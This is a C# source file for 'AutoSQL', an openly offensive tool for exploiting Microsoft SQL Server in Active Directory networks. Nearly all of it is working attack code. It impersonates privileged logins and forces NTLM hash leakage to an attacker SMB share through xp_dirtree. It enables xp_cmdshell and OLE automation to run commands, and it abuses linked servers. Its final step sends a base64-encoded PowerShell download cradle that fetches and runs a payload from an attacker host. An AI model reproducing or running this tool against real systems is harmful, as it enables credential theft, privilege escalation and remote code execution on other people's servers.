using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("------------------------------------------------------------------------------------------");
            Console.WriteLine("      AutoSQL is a SQL enumeration and exploitation tool for AD environments");
            Console.WriteLine("------------------------------------------------------------------------------------------");
            Console.WriteLine("Author: Ananth Gottimukala aka she11z");
            Console.WriteLine("           LOVE OFFSEC");
            Console.WriteLine("------------------------------------------------------------------------------------------");

            Console.Write("\n[Q] Please enter SQL Server domain name (Mostly your current instance): ");
            String sqlServer = Console.ReadLine();
            Console.Write("[Q] Please enter database name (Mostly it will be master): ");
            String database = Console.ReadLine();
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("\n[+] Authentication Success!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication Failed");
                Environment.Exit(0);
            }

            String querylogin = "SELECT SYSTEM_USER;";  //SYSTEM_USER contains the system username of current session login
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Logged in as " + reader[0]);
            reader.Close();

            String queryuser = "SELECT USER_NAME();";  //To get Mapped Username
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Mapped to User " + reader[0]);
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');"; //Check for user in public role
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("[+] User is a Member of Public Role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a Member of Public Role");
            }
            reader.Close();

            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');"; //Check for user in sysadmin role
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("[+] User is a Member of SysAdmin Role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a Member of SysAdmin Role");
            }
            reader.Close();
                       
            Console.WriteLine("\n[+] Checking which logins allow impersonation (if any) ...\n");
            String imp_query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id =b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            command = new SqlCommand(imp_query, con);
            reader = command.ExecuteReader();

            while (reader.Read() == true)
            {
                Console.WriteLine("---> " + reader[0]);
            }
            reader.Close();

            Console.Write("\n[Q] Do you want to test impersonation against any login if mentioned above? (y/n): ");
            String question1 = Console.ReadLine();
            if (question1 == "y")
            {
                try
                {
		        Console.Write("[Q] Please enter the name of login to impersonate: ");
		        String login_name = Console.ReadLine();

		        Console.WriteLine("\n[+] Testing impersonating " + login_name + " login");
		        queryuser = "SELECT SYSTEM_USER;";
		        command = new SqlCommand(queryuser, con);
		        reader = command.ExecuteReader();
		        reader.Read();
		        Console.WriteLine("[+] [Before Impersonation] running as " + reader[0]);
		        reader.Close();
		        String executeas = "EXECUTE AS LOGIN = '" + login_name + "';";
		        command = new SqlCommand(executeas, con);
		        reader = command.ExecuteReader();
		        reader.Close();
		        command = new SqlCommand(queryuser, con);
		        reader = command.ExecuteReader();
		        reader.Read();
		        Console.WriteLine("[+] [After Impersonation] running as " + reader[0]);
		        reader.Close();

		        Console.WriteLine("\n[+] Testing impersonating dbo user in msdb");
		        queryuser = "SELECT USER_NAME();";                
		        executeas = "use msdb; EXECUTE AS USER = 'dbo'";
		        command = new SqlCommand(executeas, con);
		        reader = command.ExecuteReader();
		        reader.Close();
		        command = new SqlCommand(queryuser, con);
		        reader = command.ExecuteReader();
		        reader.Read();
		        Console.WriteLine("[+] [After Impersonation] running as " + reader[0]);
		        reader.Close();
		}
		catch (Exception e)
                {
                    Console.WriteLine("[-] Failed to Impersonate Message: " + e.Message);
                }
            }
            else
            {
            }

            Console.Write("\n[Q] Do you want to try get NET-NTLM Hash? [NOTE: Ensure Responder/Impacket is listening] (y/n): ");
            String question = Console.ReadLine();
            if (question == "y")
            {
                Console.Write("[Q] Please enter IP for attacker machine running Responder/Impacket: ");
                String smb_ip = Console.ReadLine();
                Console.WriteLine("[+] Trying to connect SMB share on " + smb_ip + " ...");
                String query = "EXEC master..xp_dirtree \"\\\\" + smb_ip + "\\\\test\";";
                command = new SqlCommand(query, con);
                reader = command.ExecuteReader();
                reader.Close();
                Console.WriteLine("[+] Please check Responder/Impacket interface on Kali");
            }
            else
            {
            }

            Console.Write("\n[Q] Do you want to try Command Execution on " + sqlServer + " as impersonated user? (y/n): ");
            String question2 = Console.ReadLine();
            if (question2 == "y")
            {
                Console.Write("[Q] Please enter the login name like sa: ");
                String implogin = Console.ReadLine();
                Console.Write("[Q] Please enter command to execute for technique-1 (xp_cmdshell): ");
                String cmd = Console.ReadLine();
                Console.WriteLine("\n[+] Trying technique-1 by enabling xp_cmdshell procedure if disabled ...");
                String impersonateUser = "EXECUTE AS LOGIN = '" + implogin + "';";
                String enable_xpcmdshell = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                String execcmd = "EXEC xp_cmdshell " + cmd;

                command = new SqlCommand(impersonateUser, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(enable_xpcmdshell, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(execcmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[+] Command output - ");
                while (reader.Read())
                {
                    Console.WriteLine(reader[0]);
                }
                reader.Close();

                Console.WriteLine("\n[+] Trying technique-2 by enabling sp_OACreate procedure if disabled ...");
                impersonateUser = "EXECUTE AS LOGIN = '" + implogin + "';";
                String enable_sp_oacreate = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                execcmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo she11z was here! > C:\\Windows\\Tasks\\she11z.txt\"';";

                command = new SqlCommand(enable_sp_oacreate, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(execcmd, con);
                reader = command.ExecuteReader();
                Console.WriteLine("[+] As a POC, a file named she11z.txt is saved at C:\\Windows\\Tasks directory on SQL server");
                reader.Close();
            }
            else
            {
            }

            Console.Write("\n[Q] Do you want to check for linked SQL servers (This can be even done with unprivileged user/login)? (y/n): ");
            String question3 = Console.ReadLine();
            if (question3 == "y")
            {
                string execCmd = "EXEC sp_linkedservers;";

                command = new SqlCommand(execCmd, con);
                reader = command.ExecuteReader();
                Console.WriteLine("\n[+] Linked SQL Servers - ");
                while (reader.Read())
                {                    
                    Console.WriteLine("---> " + reader[0]);
                }
                reader.Close();
            }
            else
            {
            }

            Console.Write("\n[Q] Do you want to check access on linked SQL servers (if mentioned above)? (y/n): ");
            String question4 = Console.ReadLine();
            if (question4 == "y")
            {
                Console.Write("[Q] Please enter linked SQL server name: ");
                try
                {
                    string linkedsqlserver = Console.ReadLine();
                    Console.WriteLine("[+] Checking access on: " + linkedsqlserver);
                    string execLinkedServer = "select myuser from openquery(\"" + linkedsqlserver + "\", 'select SYSTEM_USER as myuser');";
                    command = new SqlCommand(execLinkedServer, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("[+] Executing as " + reader[0] + " on " + linkedsqlserver);
                    reader.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Cannot make connection to remote SQL server. RPC out could be disabled. Message: " + e.Message);
                    Console.WriteLine("[-] In next question you can enable and do more...");
                }
            }
            else
            {
            }

            Console.Write("\n[Q] Do you want to enable RPC out, xp_cmdshell and execute command on remote SQL server (y/n)?: ");
            String question5 = Console.ReadLine();
            if (question5 == "y")
            {
                try
                {
                    Console.Write("\n[Q] Do you want to impersonate any login like sa? Check output of linked SQL server access above (y/n): ");
                    string question6 = Console.ReadLine();
                    if (question6 == "y")
                    {
                        Console.Write("[Q] Please enter the name of login to impersonate: ");
                        String login_name = Console.ReadLine();

                        Console.WriteLine("\n[+] Testing impersonating " + login_name + " login");
                        queryuser = "SELECT SYSTEM_USER;";
                        command = new SqlCommand(queryuser, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("[+] [Before Impersonation] running as " + reader[0]);
                        reader.Close();
                        String executeas = "EXECUTE AS LOGIN = '" + login_name + "';";
                        command = new SqlCommand(executeas, con);
                        reader = command.ExecuteReader();
                        reader.Close();
                        command = new SqlCommand(queryuser, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("[+] [After Impersonation] running as " + reader[0]);
                        reader.Close();
                    }
                    else
                    {
                    }                   

                    Console.Write("\n[Q] Please enter remote SQL server name: ");
                    string server = Console.ReadLine();
                    Console.WriteLine("[+] Trying to enable RPC out using sp_serveroptions");
                    string serveroption = "EXEC sp_serveroption '" + server + "', 'rpc out', 'true';";
                    command = new SqlCommand(serveroption, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("[+] Done! RPC out enabled for remote SQL server");
                    reader.Close();

                    Console.WriteLine("[+] Enabling xp_cmdshell options");
                    string enableoption = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + server;
                    command = new SqlCommand(enableoption, con);
                    reader = command.ExecuteReader();
                    reader.Close();
                    Console.WriteLine("[+] Enabling xp_cmdshell procedure");
                    string enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + server;
                    command = new SqlCommand(enablexpcmdshell, con);
                    reader = command.ExecuteReader();
                    reader.Close();
                    Console.WriteLine("\n[NOTE] Please enter PS download cradle with EXACT single & double quotes format --> \"(New-Object System.Net.Webclient).DownloadString('http://XXX.YYY.XXX.ZZZ/Reflection.txt') | iex\"");
                    Console.Write("\n[Q] Please enter PS download cradle: ");
                    string shellcode = Console.ReadLine();
                    string code = shellcode.Replace("\"","");

                    var psCommandBytes = System.Text.Encoding.Unicode.GetBytes(code);
                    var psCommandBase64 = Convert.ToBase64String(psCommandBytes);                   


                    string shellcodecmd = "EXEC ('xp_cmdshell ''powershell -enc " + psCommandBase64 + "'';') AT " + server;                   
                    Console.WriteLine("[+] Executing Shellcode on " + server + " .Please make sure listener is running");
                    Console.WriteLine("\n[+] Your PS cradle: " + code);
                    Console.WriteLine("[+] Whole xp_cmdshell command: " + shellcodecmd);
                    command = new SqlCommand(shellcodecmd, con);
                    reader = command.ExecuteReader();
                    Console.WriteLine("\n[+] Output (if any) - ");
                    while (reader.Read())
                    {
                        Console.WriteLine("---> " + reader[0]);
                    }
                    reader.Close();
                    con.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Error: " + e.Message);
                    Environment.Exit(0);
                }                          
            
            }
            else 
            {
            }            
        }
    }
}
